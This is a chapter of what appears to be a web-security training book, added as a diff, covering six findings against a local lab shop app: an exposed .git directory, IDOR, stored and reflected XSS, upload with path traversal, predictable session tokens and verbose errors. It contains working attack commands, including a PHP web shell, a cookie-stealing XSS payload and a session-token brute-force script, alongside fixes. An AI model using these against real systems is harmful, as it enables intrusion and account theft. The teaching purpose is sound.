@@ -1,0 +1,62 @@
+<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="utf-8"/>
+<title>Session 4: The Web Application Grab Bag</title>
+<link rel="stylesheet" type="text/css" href="../styles.css"/>
+</head>
+<body>
+<h1>Session 4: The Web Application Grab Bag</h1>
+<p>Goal for this session: six findings that do not share a category but do share a theme, the application trusts something it should not. It trusts a URL parameter to name whose data you get. It trusts a filename. It trusts a stored string to be safe HTML. It trusts a token it made out of the clock. Two of these ZAP flags for you; four it does not.</p>
+<h2>4.1 Exposed <code>.git</code> Directory</h2>
+<p>A real git repository sits inside the web root at <code>/admin/.git/</code>. gobuster or ffuf against <code>/admin/</code> finds it; ZAP's spider often will not, because it depends on wordlist coverage.</p>
+<pre>gobuster dir -u http://127.0.0.1:8080/admin/ -w &lt;wordlist&gt;
+git-dumper http://127.0.0.1:8080/admin/.git/ ./loot
+cd loot &amp;&amp; git log -p | grep -i api_key</pre>
+<p>The working copy of <code>config.php</code> is clean, it reads the key from an environment variable. But the first commit put the key in cleartext, and the second commit only "moved it to the environment." The key is still in history:</p>
+<pre>WIDGETORIUM_API_KEY = 'wdg_live_sk_7f3c9a1e42b84d06b1e5c2aa9d770f18'</pre>
+<p>The fix is two-part and both parts matter: never deploy <code>.git</code> into a web root, and rotate any secret that has ever been committed, because "we removed it" is not "it is gone."</p>
+<h2>4.2 IDOR on Order History</h2>
+<p>Order IDs are sequential from 1001, and <code>orders.php?id=</code> does not check that the order belongs to you.</p>
+<pre>for i in $(seq 1001 1030); do
+  curl -s "http://127.0.0.1:8080/orders.php?id=$i" | grep -o 'Customer ID [0-9]*'
+done</pre>
+<p>No login required. You are reading thirty customers' orders and line items by counting. ZAP sees a page that returns <code>200</code> and moves on; it has no idea the ID belongs to someone else. The fix is an ownership check, <code>AND customer_id = &lt;session user&gt;</code>, before the row is returned. Unpredictable IDs help but are not the fix.</p>
+<h2>4.3 Reflected and Stored XSS in Reviews</h2>
+<p>Reflected, on the search page:</p>
+<pre>http://127.0.0.1:8080/search.php?q=&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+<p>Stored, through the review form, which needs no login and encodes nothing:</p>
+<pre>curl -s -d "product_id=1&amp;author=x&amp;body=&lt;script&gt;alert(document.cookie)&lt;/script&gt;" \
+     http://127.0.0.1:8080/review.php</pre>
+<p>Load that product page and the script runs for every visitor. Because the session cookie is not <code>HttpOnly</code> (Session 4.5), <code>document.cookie</code> hands you the token. ZAP flags both variants on the active scan. The fix is output encoding at render time plus a Content-Security-Policy, and setting <code>HttpOnly</code> so a stray script cannot read the cookie.</p>
+<h2>4.4 Unrestricted Upload with Path Traversal</h2>
+<p>The "sell a widget" form takes an image with no extension check, no content-type check, and, if you supply the optional "save as" field, it uses that name verbatim. Files land under the web root where PHP executes.</p>
+<pre>printf '&lt;?php echo "SH:".shell_exec($_GET["c"]);' &gt; sh.php
+curl -s -F 'image=@sh.php' http://127.0.0.1:8080/upload.php
+curl -s 'http://127.0.0.1:8080/uploads/sh.php?c=id'          # SH:uid=33(www-data)...</pre>
+<p>Now the traversal. PHP strips the path from <code>$_FILES['name']</code>, but the plain <code>filename</code> form field is not sanitised:</p>
+<pre>curl -s -F 'image=@sh.php' -F 'filename=../trav.php' http://127.0.0.1:8080/upload.php
+curl -s 'http://127.0.0.1:8080/trav.php?c=id'                # served one directory up</pre>
+<p>The fix: whitelist extensions, validate content server-side, <code>basename()</code> the name, store uploads outside the web root, and disable script execution in the upload directory. Any one of those alone is not enough; a real fix does several.</p>
+<h2>4.5 Predictable Session Tokens</h2>
+<p>Log in as two seed users about a second apart and compare the <code>WIDGET_SESSID</code> cookies. The structure is <code>hex(unix_time)</code> followed by a zero-padded <code>hex(user_id)</code>. It is not PHP's session ID; the application rolled its own.</p>
+<p>The token is validated against a <code>sessions</code> row, so the target needs an <em>active</em> session, but that is the whole attack: an administrator logs in (or you use the Session 2 auth bypass, which mints exactly this cookie for user ID 1), and from a fresh client you enumerate a few hundred <code>hex(time)</code> values around that login for user ID <code>0001</code> until one loads the admin account.</p>
+<pre>python3 - &lt;&lt;'PY'
+import time, requests
+uid = "0001"
+for t in range(int(time.time())-400, int(time.time())+1):
+    tok = f"{t:x}{uid}"
+    r = requests.get("http://127.0.0.1:8080/account.php",
+                     cookies={"WIDGET_SESSID": tok})
+    if "admin" in r.text.lower():
+        print("hit:", tok); break
+PY</pre>
+<p>The fix is cryptographically random tokens, <code>random_bytes</code>, or simply using the platform session manager instead of inventing one. Running with <code>WEAK_SESSIONS=0</code> takes the attack off the table.</p>
+<h2>4.6 Verbose Error Messages</h2>
+<pre>curl -s "http://127.0.0.1:8080/search.php?q=%27"</pre>
+<p>The response contains the failing SQL string and a stack trace. That is the raw material for Sessions 2.1 and 2.3, it hands you table and column names. ZAP flags it as information disclosure on the passive scan. The fix is generic error pages in production, <code>display_errors = Off</code>, and detailed logging kept server-side where the attacker cannot read it.</p>
+<h2>4.7 What You Should Notice</h2>
+<p>Reflected XSS and verbose errors, the two a scanner catches here, are the two where the payload goes straight back in the response. The four it misses, the <code>.git</code> directory, the IDOR, the upload, the session token, all require the tester to hold a model of how the application <em>should</em> behave and notice where it does not. That model is the job. The scanner is an assistant.</p>
+</body>
+</html>
